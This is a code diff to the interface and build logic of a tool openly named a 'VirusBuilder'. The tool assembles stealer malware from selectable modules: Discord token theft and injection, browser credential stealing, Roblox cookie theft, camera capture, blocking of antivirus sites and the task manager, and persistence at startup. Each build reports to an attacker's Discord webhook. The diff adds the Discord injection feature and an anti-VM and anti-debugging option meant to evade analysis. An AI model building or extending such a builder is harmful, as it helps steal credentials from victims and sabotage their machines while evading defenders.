@@ -60,6 +60,7 @@ try:
 
     def convert_to_exe(file_python, path_destination, name_file, icon_path=None):
         
+        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Uninstallation of pathlib. {reset}")
         if sys.platform.startswith("win"):
             os.system("python -m pip uninstall pathlib")
         elif sys.platform.startswith("linux"):
@@ -254,6 +255,7 @@ try:
 
     add_system = "Disable"
     add_discord = "Disable"
+    add_discordinjection = "Disable"
     add_browser = "Disable"
     add_roblox = "Disable"
     add_cameracapture = "Disable"
@@ -268,12 +270,14 @@ try:
     add_fake_error = "Disable"
     add_startup = "Disable"
     add_restart = "Disable"
+    add_antivmanddebug = "Disable"
     webhook = "None"
     name_file = "None"
     icon_path = ""
 
     add_system_var = tk.StringVar(value="Disable")
     add_discord_var = tk.StringVar(value="Disable")
+    add_discordinjection_var = tk.StringVar(value="Disable")
     add_browser_var = tk.StringVar(value="Disable")
     add_roblox_var = tk.StringVar(value="Disable")
     add_cameracapture_var = tk.StringVar(value="Disable")
@@ -288,6 +292,7 @@ try:
     add_fake_error_var = tk.StringVar(value="Disable")
     add_startup_var = tk.StringVar(value="Disable")
     add_restart_var = tk.StringVar(value="Disable")
+    add_antivmanddebug_var = tk.StringVar(value="Disable")
     file_type_var = tk.StringVar(value="Python File")
 
     style.configure('Custom.TCheckbutton', font=('Calibri', 18, "bold"), background=root.cget('bg'), foreground=text_color)
@@ -299,6 +304,7 @@ try:
 
     add_system_cb = ttk.Checkbutton(root, text="System Info", variable=add_system_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_discord_cb = ttk.Checkbutton(root, text="Discord Token", variable=add_discord_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_discordinjection_cb = ttk.Checkbutton(root, text="Discord Injection", variable=add_discordinjection_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_browser_cb = ttk.Checkbutton(root, text="Browser Steal", variable=add_browser_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_roblox_cb = ttk.Checkbutton(root, text="Roblox Cookie", variable=add_roblox_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_cameracapture_cb = ttk.Checkbutton(root, text="Camera Capture", variable=add_cameracapture_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
@@ -307,11 +313,12 @@ try:
 
     add_system_cb.grid(row=4, column=0, padx=(220, 20), sticky="w")
     add_discord_cb.grid(row=5, column=0, padx=(220, 20), sticky="w")
-    add_browser_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
-    add_roblox_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
-    add_cameracapture_cb.grid(row=4, column=1, padx=(0, 0), sticky="w")
-    add_screenshot_cb.grid(row=5, column=1, padx=(0, 0), sticky="w")
-    add_openuserprofilsettings_cb.grid(row=6, column=1, padx=(0, 0), sticky="w")
+    add_discordinjection_cb.grid(row=6, column=0, padx=(220, 20), sticky="w")
+    add_browser_cb.grid(row=7, column=0, padx=(220, 20), sticky="w")
+    add_roblox_cb.grid(row=4, column=1, padx=(0, 0), sticky="w")
+    add_cameracapture_cb.grid(row=5, column=1, padx=(0, 0), sticky="w")
+    add_screenshot_cb.grid(row=6, column=1, padx=(0, 0), sticky="w")
+    add_openuserprofilsettings_cb.grid(row=7, column=1, padx=(0, 0), sticky="w")
 
     text_malwareoptions = tk.Label(root, text="Malware Options:", font=("Calibri", 22), background=background_color, foreground=text_color)
     text_malwareoptions.grid(row=9, column=0, pady=(15, 0), padx=(103, 0))
@@ -325,6 +332,7 @@ try:
     add_fake_error_cb = ttk.Checkbutton(root, text="Fake Error", variable=add_fake_error_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton', command=create_fake_error_window)
     add_startup_cb = ttk.Checkbutton(root, text="Launch at Startup", variable=add_startup_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
     add_restart_cb = ttk.Checkbutton(root, text="Restart Every 5min", variable=add_restart_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
+    add_antivmanddebug_cb = ttk.Checkbutton(root, text="Anti VM & Debug", variable=add_antivmanddebug_var, onvalue="Enable", offvalue="Disable", style='Custom.TCheckbutton')
 
     add_blockkey_cb.grid(row=10, column=0, padx=(220, 20), sticky="w")
     add_blockmouse_cb.grid(row=11, column=0, padx=(220, 20), sticky="w")
@@ -335,10 +343,11 @@ try:
     add_fake_error_cb.grid(row=11, column=1, padx=(0, 0), sticky="w")
     add_startup_cb.grid(row=12, column=1, padx=(0, 0), sticky="w")
     add_restart_cb.grid(row=13, column=1, padx=(0, 0), sticky="w")
+    add_antivmanddebug_cb.grid(row=14, column=1, padx=(0, 0), sticky="w")
 
     text_altgr = tk.Label(root, text='''To cancel the Block Mouse and Block Key 
     and Spam Open Program, press "Alt" + "Alt Gr"''', font=("Calibri", 12), background=background_color, foreground=text_color)
-    text_altgr.grid(row=14, column=1,pady=(15, 0), padx=(10, 0))
+    text_altgr.grid(row=15, column=1,pady=(15, 0), padx=(10, 0))
 
     def openuserprofile_state(*args):
         if add_screenshot_var.get() == "Enable":
@@ -446,9 +455,10 @@ try:
 
     # <<<<<<<<<< Build Button >>>>>>>>>>
     def Build_Settings():
-        global add_system, add_discord, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_spamopenprograms, add_shutdown ,add_fake_error,  add_startup, add_restart, webhook, name_file, file_type
+        global add_system, add_discord, add_discordinjection, add_browser, add_roblox, add_cameracapture, add_openuserprofilsettings, add_screenshot, add_blockkey, add_blockmouse, add_blocktaskmanager, add_blockwebsite, add_spamopenprograms, add_shutdown ,add_fake_error,  add_startup, add_restart, add_antivmanddebug, webhook, name_file, file_type
         add_system = add_system_var.get()
         add_discord = add_discord_var.get()
+        add_discordinjection = add_discordinjection_var.get()
         add_browser = add_browser_var.get()
         add_roblox = add_roblox_var.get()
         add_cameracapture = add_cameracapture_var.get()
@@ -463,6 +473,7 @@ try:
         add_fake_error = add_fake_error_var.get()
         add_startup = add_startup_var.get()
         add_restart = add_restart_var.get()
+        add_antivmanddebug = add_antivmanddebug_var.get()
         webhook = webhook_entry.get()
         name_file = name_file_entry.get()
 
@@ -490,45 +501,49 @@ try:
 
     root.mainloop()
 
-    CheckWebhook(webhook)
+    #CheckWebhook(webhook)
+    width = 18
+    print(f"""
+    {add_system          } System Info         {add_openuserprofilsettings} Open UserProfil     {add_fake_error    } Fake Error
+    {add_discord         } Discord Token       {add_blockkey              } Block Key           {add_startup       } Launch at Startup
+    {add_discordinjection} Discord Injection   {add_blockmouse            } Block Mouse         {add_restart       } Restart Every 5min
+    {add_browser         } Browser Steal       {add_blocktaskmanager      } Block Task Manager  {add_antivmanddebug} Anti VM & Debug
+    {add_roblox          } Roblox Cookie       {add_blockwebsite          } Block AV Website
+    {add_cameracapture   } Camera Capture      {add_shutdown              } Shutdown
+    {add_screenshot      } Screenshot          {add_spamopenprograms      } Spam Open Program
 
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Webhook            :{white}", webhook)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} System Info        :{white}", add_system)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Discord Token      :{white}", add_discord)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Browser Steal      :{white}", add_browser)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Roblox Cookie      :{white}", add_roblox)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Camera Capture     :{white}", add_cameracapture)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Screenshot         :{white}", add_screenshot)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Open UserProfil    :{white}", add_openuserprofilsettings)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Block Key          :{white}", add_blockkey)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Block Mouse        :{white}", add_blockmouse)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Block Task Manager :{white}", add_blocktaskmanager)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Block AV Website   :{white}", add_blockwebsite)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Shutdown           :{white}", add_shutdown)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Spam Open Program  :{white}", add_spamopenprograms)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error         :{white}", add_fake_error)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Launch at Startup  :{white}", add_startup)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Restart Every 5min :{white}", add_restart)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} File Type          :{white}", file_type)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} File Name          :{white}", name_file)
-    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Icon Path          :{white}", icon_path)
+    {red}Webhook   : {white + webhook[:100] + '.' * 3}
+    {red}File Type : {white + file_type}
+    {red}File Name : {white + name_file}""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))
+    if icon_path:
+        if 100 < len(icon_path):
+            icon_path_cut = icon_path[:100] + '.' * 3
+        else:
+            icon_path_cut = icon_path
+        print(f"    {red}Icon Path : {white + icon_path_cut}")
 
-    file_python_relative = f'./1-Output/VirusBuilder/{name_file}.py'
-    file_python = os.path.abspath(file_python_relative)
+    file_python_relative = f'\\1-Output\\VirusBuilder\\{name_file}.py'
+    file_python = os.path.join(tool_path, "1-Output", "VirusBuilder", f"{name_file}.py")
 
-    path_destination_relative = "./1-Output/VirusBuilder"
-    path_destination = os.path.abspath(path_destination_relative)
+    path_destination_relative = "\\1-Output\\VirusBuilder"
+    path_destination = os.path.join(tool_path, "1-Output", "VirusBuilder")
 
     try:
         with open(file_python, 'w', encoding='utf-8') as file:
-            file.write(f"w3bh00k_ur1 = \"{webhook}\"")
-            file.write(Obligatory)
+
+            if add_antivmanddebug in ['Enable']:
+                file.write(Ant1VM4ndD3bug)
+
+            file.write(Obligatory.replace("%WEBHOOK_URL%", webhook))
 
             if add_system in ['Enable']:
                 file.write(Sy5t3mInf0)
 
             if add_discord in ['Enable']:
                 file.write(Di5c0rdT0k3n)
+
+            if add_discordinjection in ['Enable']:
+                file.write(Di5c0rdIj3ct10n)
 
             if add_browser in ['Enable']:
                 file.write(Br0w53r5t341)
@@ -574,9 +589,9 @@ try:
             if add_restart in ['Enable']:
                 file.write(R3st4rt)
 
-        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
+        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
     except Exception as e:
-        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
+        print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
 
     if file_type in ['Exe File']:
         convert_to_exe(file_python, path_destination, name_file, icon_path)
@@ -605,6 +620,7 @@ try:
             {"name": f"File Type:", "value": f"""```{file_type}```""", "inline": True},
             {"name": f"System Info:", "value": f"""```{add_system}```""", "inline": True},
             {"name": f"Discord Token:", "value": f"""```{add_discord}```""", "inline": True},
+            {"name": f"Discord Injection:", "value": f"""```{add_discordinjection}```""", "inline": True},
             {"name": f"Browser Steal:", "value": f"""```{add_browser}```""", "inline": True},
             {"name": f"Roblox Cookie:", "value": f"""```{add_roblox}```""", "inline": True},
             {"name": f"Camera Capture:", "value": f"""```{add_cameracapture}```""", "inline": True},
@@ -619,7 +635,8 @@ try:
             {"name": f"Fake Error:", "value": f"""```{add_fake_error}```""", "inline": True},
             {"name": f"Launch At Startup:", "value": f"""```{add_startup}```""", "inline": True},
             {"name": f"Restart Every 5min:", "value": f"""```{add_restart}```""", "inline": True},
-            {"name": f"Webhook:", "value": f"""{webhook}""", "inline": False},
+            {"name": f"Anti VM & Debug:", "value": f"""```{add_antivmanddebug}```""", "inline": True},
+            {"name": f"Webhook:", "value": f"""{webhook}""", "inline": True},
         ]
 
         embed = {
